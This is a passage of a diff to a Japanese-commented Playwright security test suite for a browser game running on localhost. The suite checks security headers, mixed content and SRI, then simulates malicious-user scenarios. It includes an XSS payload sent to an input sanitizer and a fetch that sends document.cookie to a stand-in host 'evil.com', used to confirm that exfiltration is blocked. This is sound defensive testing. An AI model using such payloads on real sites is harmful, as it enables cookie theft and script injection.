     }
-    
+
     // Permissions-Policy検証
     if (securityHeaders['Permissions-Policy']) {
       console.log(`  🛡️ Permissions-Policy: ✅ ${securityHeaders['Permissions-Policy']}`);
     } else {
-      console.log(`  🛡️ Permissions-Policy: ⚠️ 未設定`);
+      console.log('  🛡️ Permissions-Policy: ⚠️ 未設定');
     }
-    
+
     // ブラウザセキュリティポリシーテスト
     console.log('\n🧪 ブラウザセキュリティポリシーテスト:');
-    
+
     // Same-Origin Policy テスト
     const sameOriginTest = await page.evaluate(() => {
       try {
@@ -1345,71 +1345,71 @@ except Exception as e:
         return { blocked: true, error: e.message };
       }
     });
-    
+
     console.log(`  🌐 Same-Origin Policy: ${sameOriginTest.blocked ? '✅ 正常にブロック' : '⚠️ ブロックされず'}`);
-    
+
     // Mixed Content検証
     if (page.url().startsWith('https://')) {
       console.log('  🔒 Mixed Contentテスト:');
-      
+
       const mixedContentTest = await page.evaluate(() => {
         return new Promise((resolve) => {
           const img = new Image();
           const testTimeout = setTimeout(() => {
             resolve({ blocked: true, reason: 'timeout' });
           }, 5000);
-          
+
           img.onload = () => {
             clearTimeout(testTimeout);
             resolve({ blocked: false, loaded: true });
           };
-          
+
           img.onerror = () => {
             clearTimeout(testTimeout);
             resolve({ blocked: true, reason: 'error' });
           };
-          
+
           // HTTPリソースを読み込み試行
           img.src = 'http://httpbin.org/status/200';
         });
       });
-      
+
       console.log(`    📷 HTTP画像読み込み: ${mixedContentTest.blocked ? '✅ ブロック' : '⚠️ 許可'}`);
     }
-    
+
     // Subresource Integrity (SRI) テスト
     console.log('  🔐 Subresource Integrityテスト:');
-    
+
     const sriElements = await page.evaluate(() => {
       const scripts = Array.from(document.querySelectorAll('script[src]'));
       const links = Array.from(document.querySelectorAll('link[rel="stylesheet"]'));
-      
+
       return {
         scripts: scripts.map(s => ({ src: s.src, integrity: s.integrity })),
         styles: links.map(l => ({ href: l.href, integrity: l.integrity }))
       };
     });
-    
+
     sriElements.scripts.forEach(script => {
       if (script.src.includes('http') && !script.src.includes(page.url().split('/')[2])) {
         console.log(`    📜 外部スクリプト: ${script.src.substring(0, 50)}... ${script.integrity ? '✅ SRI有効' : '⚠️ SRI無効'}`);
       }
     });
-    
+
     sriElements.styles.forEach(style => {
       if (style.href.includes('http') && !style.href.includes(page.url().split('/')[2])) {
         console.log(`    🎨 外部スタイル: ${style.href.substring(0, 50)}... ${style.integrity ? '✅ SRI有効' : '⚠️ SRI無効'}`);
       }
     });
-    
+
     console.log('✅ セキュリティヘッダー・ポリシー検証テスト完了');
   });
 
   test('システム全体セキュリティ・整合性統合テスト', async ({ page }) => {
     console.log('🏛️ システム全体セキュリティ・整合性統合テストを開始...');
-    
+
     await page.goto('http://localhost:3000/docs/game.html');
-    
+
     // Pyodideの初期化を待つ
     try {
       const loadingOverlay = page.locator('#loadingOverlay');
@@ -1418,15 +1418,15 @@ except Exception as e:
     } catch (e) {
       console.log('⚠️ Pyodide初期化タイムアウト');
     }
-    
+
     await page.waitForTimeout(3000);
-    
+
     // 統合セキュリティテストシナリオ
     console.log('🧪 統合セキュリティテストシナリオを実行中...');
-    
+
     // シナリオ1: 悪意のあるユーザーによる総合攻撃シミュレーション
     console.log('\n📋 シナリオ1: 悪意のあるユーザー攻撃シミュレーション');
-    
+
     const maliciousScenarios = [
       {
         name: 'XSSインジェクション + データ改ざん',
@@ -1438,7 +1438,7 @@ except Exception as e:
               window.testInputSanitization('<img src=x onerror=alert("XSS")>', 'ranking_name');
             }
           });
-          
+
           // 不正なスコア値での登録試行
           await page.evaluate(() => {
             if (window.validateDataIntegrity) {
@@ -1461,7 +1461,7 @@ except Exception as e:
               console.log('LocalStorage operation blocked:', e.message);
             }
           });
-          
+
           // クッキーの不正操作
           await page.evaluate(() => {
             try {
@@ -1490,7 +1490,7 @@ except Exception as e:
             } catch (e) {
               console.log('API request blocked:', e.message);
             }
-            
+
             // 外部への不正リクエスト
             try {
               await fetch('http://evil.com/steal?data=' + encodeURIComponent(document.cookie));
@@ -1524,11 +1524,11 @@ except Exception as e:
         }
       }
     ];
-    
+
     // 各シナリオを実行
     for (const scenario of maliciousScenarios) {
       console.log(`  🧪 実行中: ${scenario.name}`);
-      
+
       try {
         await scenario.actions();
         await page.waitForTimeout(500);
@@ -1537,10 +1537,10 @@ except Exception as e:
         console.log(`    ⚠️ シナリオエラー: ${scenario.name} - ${e.message}`);
       }
     }
-    
+
     // セキュリティメトリクスの最終評価
     console.log('\n📊 セキュリティメトリクス最終評価:');
-    
+
     const finalSecurityMetrics = await page.evaluate(() => {
       if (window.securityTestData) {
         return {
@@ -1554,7 +1554,7 @@ except Exception as e:
       }
       return null;
     });
-    
+
     if (finalSecurityMetrics) {
       console.log('📈 セキュリティスコアカード:');
       console.log(`  🛡️ ブロックした攻撃: ${finalSecurityMetrics.securityMetrics.blockedAttacks}`);
@@ -1567,30 +1567,30 @@ except Exception as e:
       console.log(`  💾 ストレージテスト: ${finalSecurityMetrics.storageTests}`);
       console.log(`  🌐 ネットワークテスト: ${finalSecurityMetrics.networkTests}`);
       console.log(`  🔒 整合性チェック: ${finalSecurityMetrics.integrityChecks}`);
-      
+
       // セキュリティ基準の評価
       const securityScore = {
         attackDefenseRate: finalSecurityMetrics.securityMetrics.blockedAttacks > 0 ? 100 : 0,
-        validationSuccessRate: finalSecurityMetrics.securityMetrics.passedValidations > 0 ? 
-          (finalSecurityMetrics.securityMetrics.passedValidations / 
+        validationSuccessRate: finalSecurityMetrics.securityMetrics.passedValidations > 0 ?
+          (finalSecurityMetrics.securityMetrics.passedValidations /
            (finalSecurityMetrics.securityMetrics.passedValidations + finalSecurityMetrics.securityMetrics.failedValidations)) * 100 : 0,
-        dataIntegrityRate: finalSecurityMetrics.securityMetrics.dataInconsistencies === 0 ? 100 : 
+        dataIntegrityRate: finalSecurityMetrics.securityMetrics.dataInconsistencies === 0 ? 100 :
           Math.max(0, 100 - (finalSecurityMetrics.securityMetrics.dataInconsistencies * 10))
       };
-      
+
       console.log('\n🏆 セキュリティスコア:');
       console.log(`  🛡️ 攻撃防御率: ${securityScore.attackDefenseRate}%`);
       console.log(`  ✅ 検証成功率: ${securityScore.validationSuccessRate.toFixed(2)}%`);
       console.log(`  🔒 データ整合性率: ${securityScore.dataIntegrityRate}%`);
-      
+
       const overallScore = (securityScore.attackDefenseRate + securityScore.validationSuccessRate + securityScore.dataIntegrityRate) / 3;
       console.log(`  📊 総合セキュリティスコア: ${overallScore.toFixed(2)}%`);
-      
+
       // セキュリティ基準チェック
       expect(securityScore.attackDefenseRate).toBeGreaterThan(0); // 攻撃をブロックしている
       expect(securityScore.dataIntegrityRate).toBeGreaterThan(80); // データ整合性80%以上
       expect(overallScore).toBeGreaterThan(70); // 総合スコア70%以上
-      
+
       if (overallScore >= 90) {
         console.log('🏅 セキュリティ評価: 優秀 (90%以上)');
       } else if (overallScore >= 80) {
@@ -1601,20 +1601,20 @@ except Exception as e:
         console.log('⚠️ セキュリティ評価: 要改善 (70%未満)');
       }
     }
-    
+
     // 最終的なゲーム動作確認
     console.log('\n🎮 セキュリティテスト後のゲーム動作確認:');
-    
+
     await expect(page.locator('#gameCanvas')).toBeVisible();
-    
+
     // 基本操作が正常に動作することを確認
     await page.keyboard.press('ArrowLeft');
     await page.waitForTimeout(500);
     await page.keyboard.press('Space');
     await page.waitForTimeout(500);
-    
+
     console.log('✅ セキュリティテスト後もゲーム基本機能正常');
-    
+
     console.log('✅ システム全体セキュリティ・整合性統合テスト完了');
   });
 
